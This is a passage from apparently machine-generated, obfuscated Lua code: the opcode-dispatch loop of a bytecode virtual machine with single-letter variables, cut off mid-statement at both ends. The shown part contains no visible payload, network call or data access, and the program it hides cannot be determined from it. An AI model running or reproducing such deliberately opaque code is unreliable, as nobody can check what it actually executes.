w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];if w[y[134]]then n=n+1;else n=y[652];end;end;elseif 138>=z then local q=y[134]w[q]=w[q](w[(q+1)])elseif z<140 then local q;w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];q=y[134]w[q]=w[q](w[q+1])else local q=y[134];local x,ba,bb=w[q],w[q+1],w[q+2];local x=x+bb;w[q]=x;if bb>0 and x<=ba or bb<0 and x>=ba then n=y[652];w[q+3]=x;end;end;elseif z<=164 then if z<=152 then if z<=146 then if z<=143 then if(141>=z)then local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if 1~=q then x=nil else ba=nil end else if q<=2 then bb=nil else if q<4 then w[y[134]]=h[y[652]];else n=n+1;end end end else if q<=6 then if 6>q then y=f[n];else w[y[134]]=h[y[652]];end else if q<=7 then n=n+1;else if q<9 then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end end end else if q<=14 then if q<=11 then if 10<q then y=f[n];else n=n+1;end else if q<=12 then w[y[134]]=w[y[652]][w[y[76]]];else if q==13 then n=n+1;else y=f[n];end end end else if q<=16 then if q<16 then bb=y[134]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if q>18 then break else for bc=bb,y[76]do x=x+1;w[bc]=ba[x];end end end end end end q=q+1 end elseif not(143==z)then local q,x=0 while true do if q<=9 then if q<=4 then if q<=1 then if 0<q then w={};else x=nil end else if q<=2 then for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;else if q~=4 then n=n+1;else y=f[n];end end end else if q<=6 then if q>5 then n=n+1;else w[y[134]]=j[y[652]];end else if q<=7 then y=f[n];else if 9~=q then w[y[134]]=w[y[652]][y[76]];else n=n+1;end end end end else if q<=14 then if q<=11 then if q~=11 then y=f[n];else w[y[134]]=h[y[652]];end else if q<=12 then n=n+1;else if 14~=q then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end end else if q<=16 then if 16>q then n=n+1;else y=f[n];end else if q<=17 then x=y[134]else if q~=19 then w[x]=w[x](w[x+1])else break end end end end end q=q+1 end else local q,x=0 while true do if q<=8 then if q<=3 then if q<=1 then if 0==q then x=nil else w[y[134]]=w[y[652]][y[76]];end else if q>2 then y=f[n];else n=n+1;end end else if q<=5 then if 5>q then w[y[134]]=w[y[652]][y[76]];else n=n+1;end else if q<=6 then y=f[n];else if 7<q then n=n+1;else w[y[134]]=w[y[652]][y[76]];end end end end else if q<=13 then if q<=10 then if 9<q then w[y[134]]=w[y[652]][y[76]];else y=f[n];end else if q<=11 then n=n+1;else if 12==q then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end end else if q<=15 then if q>14 then y=f[n];else n=n+1;end else if q<=16 then x=y[134]else if 17<q then break else w[x]=w[x](w[x+1])end end end end end q=q+1 end end;elseif 144>=z then local q;local x,ba;local bb;w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];bb=y[134]x,ba=i(w[bb](r(w,bb+1,y[652])))p=ba+bb-1 q=0;for ba=bb,p do q=q+1;w[ba]=x[q];end;elseif z==145 then j[y[652]]=w[y[134]];else w[y[134]][y[652]]=y[76];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];end;elseif z<=149 then if 147>=z then local q;w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];q=y[134]w[q]=w[q]()elseif z>148 then do return w[y[134]]end else local q=y[134];do return r(w,q,p)end;end;elseif 150>=z then local q=y[134]w[q](w[q+1])elseif 151==z then local q;local x;local ba;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];ba=y[134]x={w[ba](w[ba+1])};q=0;for bb=ba,y[76]do q=q+1;w[bb]=x[q];end else local q;w={};for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))end;elseif 158>=z then if z<=155 then if 153>=z then w[y[134]]=w[y[652]]+y[76];elseif z<155 then local q;w[y[134]]=w[y[652]]%w[y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]]+y[76];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))else local q=y[134];w[q]=w[q]-w[q+2];n=y[652];end;elseif 156>=z then local q=y[134]w[q](r(w,q+1,y[652]))elseif 158~=z then w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];n=y[652];else w[y[134]]={};n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];end;elseif z<=161 then if z<=159 then w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]]+y[76];n=n+1;y=f[n];h[y[652]]=w[y[134]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]();elseif z==160 then w[y[134]]={r({},1,y[652])};else local q;w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))end;elseif 162>=z then local q=y[652];local x=y[76];local q=k(w,g,q,x);w[y[134]]=q;elseif 164>z then local q;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))else w[y[134]]={};end;elseif 176>=z then if z<=170 then if 167>=z then if z<=165 then w[y[134]]=w[y[652]]*y[76];elseif 166==z then local q;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))else local q;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]]*y[76];n=n+1;y=f[n];w[y[134]]=w[y[652]]+w[y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]]+w[y[76]];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))end;elseif z<=168 then local q,x,ba,bb,bc=0 while true do if q<=11 then if q<=5 then if q<=2 then if q<=0 then x=nil else if 2~=q then ba,bb=nil else bc=nil end end else if q<=3 then w[y[134]]=w[y[652]][w[y[76]]];else if 4<q then y=f[n];else n=n+1;end end end else if q<=8 then if q<=6 then w[y[134]]=w[y[652]];else if q<8 then n=n+1;else y=f[n];end end else if q<=9 then w[y[134]]=y[652];else if q>10 then y=f[n];else n=n+1;end end end end else if q<=17 then if q<=14 then if q<=12 then w[y[134]]=y[652];else if 13==q then n=n+1;else y=f[n];end end else if q<=15 then w[y[134]]=y[652];else if 17~=q then n=n+1;else y=f[n];end end end else if q<=20 then if q<=18 then bc=y[134]else if q>19 then p=bb+bc-1 else ba,bb=i(w[bc](r(w,bc+1,y[652])))end end else if q<=21 then x=0;else if q==22 then for bb=bc,p do x=x+1;w[bb]=ba[x];end;else break end end end end end q=q+1 end elseif z==169 then w[y[134]]=w[y[652]]*y[76];else local q;local x;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];x=y[134];q=w[x];for ba=x+1,y[652]do t(q,w[ba])end;end;elseif 173>=z then if(z<=171)then local q,x=0 while true do if q<=7 then if(q<=3)then if(q<1 or q==1)then if 0==q then x=nil else w[y[134]]=h[y[652]];end else if not(q==3)then n=(n+1);else y=f[n];end end else if(q==5 or q<5)then if(q~=5)then w[y[134]]=y[652];else n=(n+1);end else if not(6~=q)then y=f[n];else w[y[134]]=y[652];end end end else if(q<=11)then if(q<=9)then if(8==q)then n=n+1;else y=f[n];end else if not(q==11)then w[y[134]]=y[652];else n=(n+1);end end else if(q==13 or q<13)then if 13>q then y=f[n];else x=y[134]end else if(q<15)then w[x]=w[x](r(w,(x+1),y[652]))else break end end end end q=(q+1)end elseif 172<z then local q=y[134]w[q](r(w,(q+1),p))else local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if q>0 then w[y[134]]=w[y[652]][y[76]];else x=nil end else if 2==q then n=n+1;else y=f[n];end end else if q<=5 then if 5~=q then w[y[134]]=y[652];else n=n+1;end else if q>6 then w[y[134]]=y[652];else y=f[n];end end end else if q<=11 then if q<=9 then if q<9 then n=n+1;else y=f[n];end else if 10==q then w[y[134]]=y[652];else n=n+1;end end else if q<=13 then if 13~=q then y=f[n];else x=y[134]end else if q==14 then w[x]=w[x](r(w,x+1,y[652]))else break end end end end q=q+1 end end;elseif z<=174 then local q;w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))elseif z>175 then local q=y[134];do return w[q](r(w,q+1,y[652]))end;else w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];if w[y[134]]then n=n+1;else n=y[652];end;end;elseif 182>=z then if z<=179 then if 177>=z then local q=y[134];do return w[q](r(w,(q+1),y[652]))end;elseif z==178 then local q;w={};for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];q=y[134]w[q](w[q+1])else if(w[y[134]]~=w[y[76]])then n=n+1;else n=y[652];end;end;elseif 180>=z then if(w[y[134]]<w[y[76]]or w[y[134]]==w[y[76]])then n=y[652];else n=n+1;end;elseif z==181 then local q=y[134];local x=w[q];for ba=q+1,p do t(x,w[ba])end;else local q;w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))end;elseif 185>=z then if 183>=z then w[y[134]]=w[y[652]]/y[76];n=n+1;y=f[n];w[y[134]]=w[y[652]]-w[y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]]/y[76];n=n+1;y=f[n];w[y[134]]=w[y[652]]*y[76];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];n=y[652];elseif 184<z then w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];if w[y[134]]then n=n+1;else n=y[652];end;else w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];do return w[y[134]]end end;elseif 186>=z then local q;local x;local ba;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];ba=y[652];x=y[76];q=k(w,g,ba,x);w[y[134]]=q;elseif 187<z then local q;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))else n=y[652];end;elseif z<=282 then if z<=235 then if 211>=z then if 199>=z then if z<=193 then if z<=190 then if 189==z then w[y[134]]=j[y[652]];else local q;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))end;elseif z<=191 then local q=y[134]local x={w[q](r(w,q+1,y[652]))};local ba=0;for bb=q,y[76]do ba=ba+1;w[bb]=x[ba];end;elseif 193>z then local q;local x,ba;local bb;w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];bb=y[134]x,ba=i(w[bb](r(w,bb+1,y[652])))p=ba+bb-1 q=0;for ba=bb,p do q=q+1;w[ba]=x[q];end;else local q;w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];q=y[134]w[q]=w[q](w[q+1])end;elseif z<=196 then if(z<=194)then if not w[y[134]]then n=(n+1);else n=y[652];end;elseif(196>z)then w[y[134]]=w[y[652]]+y[76];else local q=y[134];local x,ba,bb=w[q],w[q+1],w[(q+2)];local x=x+bb;w[q]=x;if bb>0 and x<=ba or bb<0 and x>=ba then n=y[652];w[(q+3)]=x;end;end;elseif 197>=z then local q;local x;local ba;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];ba=y[652];x=y[76];q=k(w,g,ba,x);w[y[134]]=q;elseif 198<z then local q;w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];q=y[134]w[q]=w[q](r(w,q+1,y[652]))else local q;local x;w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]={r({},1,y[652])};n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];x=y[134];q=w[x];for ba=x+1,y[652]do t(q,w[ba])end;end;elseif 205>=z then if z<=202 then if 200>=z then local q=d[y[652]];local x={};local ba={};for bb=1,y[76]do n=n+1;local bc=f[n];if bc[370]==55 then ba[bb-1]={w,bc[652]};else ba[bb-1]={h,bc[652]};end;v[#v+1]=ba;end;m(x,{['\95\95\105\110\100\101\120']=function(m,m)local m=ba[m];return m[1][m[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(m,m,bb)local m=ba[m]m[1][m[2]]=bb;end;});w[y[134]]=b(q,x,j);elseif 202~=z then local m;local q;local x;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];x=y[134]q={w[x](w[x+1])};m=0;for ba=x,y[76]do m=m+1;w[ba]=q[m];end else if(w[y[134]]~=y[76])then n=n+1;else n=y[652];end;end;elseif 203>=z then local m;local q;local x;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];x=y[134]q={w[x](w[x+1])};m=0;for ba=x,y[76]do m=m+1;w[ba]=q[m];end elseif 205>z then w[y[134]]=w[y[652]]+w[y[76]];else w[y[134]][y[652]]=y[76];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];end;elseif 208>=z then if z<=206 then if(y[134]<=w[y[76]])then n=n+1;else n=y[652];end;elseif 207==z then local m;local q;local x;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];x=y[134]q={w[x](w[x+1])};m=0;for ba=x,y[76]do m=m+1;w[ba]=q[m];end else local m;local q;local x;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];x=y[134]q={w[x](w[x+1])};m=0;for ba=x,y[76]do m=m+1;w[ba]=q[m];end end;elseif 209>=z then if(y[134]<=w[y[76]])then n=n+1;else n=y[652];end;elseif 210==z then local m;local q;w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]={r({},1,y[652])};n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];q=y[134];m=w[q];for x=q+1,y[652]do t(m,w[x])end;else local m;w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];m=y[134]w[m]=w[m]()end;elseif z<=223 then if z<=217 then if 214>=z then if(212==z or 212>z)then local m,q,x,ba=0 while true do if m<=9 then if m<=4 then if m<=1 then if m>0 then x=nil else q=nil end else if m<=2 then ba=nil else if 4~=m then w[y[134]]=h[y[652]];else n=n+1;end end end else if m<=6 then if 5<m then w[y[134]]=h[y[652]];else y=f[n];end else if m<=7 then n=n+1;else if 8==m then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end end end else if m<=14 then if m<=11 then if 11>m then n=n+1;else y=f[n];end else if m<=12 then w[y[134]]=w[y[652]][w[y[76]]];else if 14~=m then n=n+1;else y=f[n];end end end else if m<=16 then if 15==m then ba=y[134]else x={w[ba](w[ba+1])};end else if m<=17 then q=0;else if m<19 then for bb=ba,y[76]do q=q+1;w[bb]=x[q];end else break end end end end end m=m+1 end elseif(z<214)then local m,q=0 while true do if m<=12 then if m<=5 then if m<=2 then if m<=0 then q=nil else if m<2 then w={};else for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;end end else if m<=3 then n=n+1;else if m>4 then w[y[134]]=h[y[652]];else y=f[n];end end end else if m<=8 then if m<=6 then n=n+1;else if 7<m then w[y[134]]=j[y[652]];else y=f[n];end end else if m<=10 then if m>9 then y=f[n];else n=n+1;end else if m<12 then w[y[134]]=w[y[652]][y[76]];else n=n+1;end end end end else if m<=18 then if m<=15 then if m<=13 then y=f[n];else if m==14 then w[y[134]]=y[652];else n=n+1;end end else if m<=16 then y=f[n];else if m<18 then w[y[134]]=y[652];else n=n+1;end end end else if m<=21 then if m<=19 then y=f[n];else if m<21 then w[y[134]]=y[652];else n=n+1;end end else if m<=23 then if 23~=m then y=f[n];else q=y[134]end else if 24<m then break else w[q]=w[q](r(w,q+1,y[652]))end end end end end m=m+1 end else local m,q=0 while true do if m<=10 then if m<=4 then if m<=1 then if m==0 then q=nil else w[y[134]]=j[y[652]];end else if m<=2 then n=n+1;else if m~=4 then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end end else if m<=7 then if m<=5 then n=n+1;else if 6<m then w[y[134]]=y[652];else y=f[n];end end else if m<=8 then n=n+1;else if 10~=m then y=f[n];else w[y[134]]=y[652];end end end end else if m<=15 then if m<=12 then if m~=12 then n=n+1;else y=f[n];end else if m<=13 then w[y[134]]=y[652];else if m<15 then n=n+1;else y=f[n];end end end else if m<=18 then if m<=16 then w[y[134]]=y[652];else if 17<m then y=f[n];else n=n+1;end end else if m<=19 then q=y[134]else if 21~=m then w[q]=w[q](r(w,q+1,y[652]))else break end end end end end m=m+1 end end;elseif z<=215 then local m=w[y[76]];if m then n=n+1;else w[y[134]]=m;n=y[652];end;elseif z<217 then local m;w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];m=y[134]w[m]=w[m](r(w,m+1,y[652]))else if(w[y[134]]<=w[y[76]])then n=n+1;else n=y[652];end;end;elseif 220>=z then if z<=218 then local m;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]]*y[76];n=n+1;y=f[n];w[y[134]]=w[y[652]]+w[y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]]+w[y[76]];n=n+1;y=f[n];m=y[134]w[m]=w[m](r(w,m+1,y[652]))elseif z~=220 then w[y[134]]=b(d[y[652]],nil,j);else if(w[y[134]]~=y[76])then n=y[652];else n=n+1;end;end;elseif z<=221 then w[y[134]]=w[y[652]]%w[y[76]];elseif 222<z then local d;local m;local q;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];q=y[134]m={w[q](w[q+1])};d=0;for x=q,y[76]do d=d+1;w[x]=m[d];end else w[y[134]]=y[652]*w[y[76]];end;elseif 229>=z then if 226>=z then if(z<=224)then local d,m=0 while true do if d<=7 then if d<=3 then if d<=1 then if 1>d then m=nil else w[y[134]]=h[y[652]];end else if d==2 then n=n+1;else y=f[n];end end else if d<=5 then if d==4 then w[y[134]]=w[y[652]][y[76]];else n=n+1;end else if 7>d then y=f[n];else w[y[134]]=y[652];end end end else if d<=11 then if d<=9 then if 8==d then n=n+1;else y=f[n];end else if 11~=d then w[y[134]]=y[652];else n=n+1;end end else if d<=13 then if d>12 then m=y[134]else y=f[n];end else if 15>d then w[m]=w[m](r(w,m+1,y[652]))else break end end end end d=d+1 end elseif not(225~=z)then local d,m=0 while true do if d<=7 then if d<=3 then if d<=1 then if 1~=d then m=nil else w[y[134]]=j[y[652]];end else if 3~=d then n=n+1;else y=f[n];end end else if d<=5 then if 5>d then w[y[134]]=w[y[652]][y[76]];else n=n+1;end else if d>6 then w[y[134]]=h[y[652]];else y=f[n];end end end else if d<=11 then if d<=9 then if d<9 then n=n+1;else y=f[n];end else if d~=11 then w[y[134]]=w[y[652]][y[76]];else n=n+1;end end else if d<=13 then if 12<d then m=y[134]else y=f[n];end else if 14<d then break else w[m]=w[m](w[m+1])end end end end d=d+1 end else w[y[134]]=false;n=n+1;end;elseif(z<227 or z==227)then if(not(w[y[134]]==y[76]))then n=y[652];else n=n+1;end;elseif z<229 then local d=w[y[76]];if not d then n=(n+1);else w[y[134]]=d;n=y[652];end;else w[y[134]]={};end;elseif 232>=z then if 230>=z then local d;w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]][y[652]]=y[76];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))elseif 231==z then w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];n=y[652];else local d;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))end;elseif z<=233 then local d,m=0 while true do if d<=13 then if d<=6 then if d<=2 then if d<=0 then 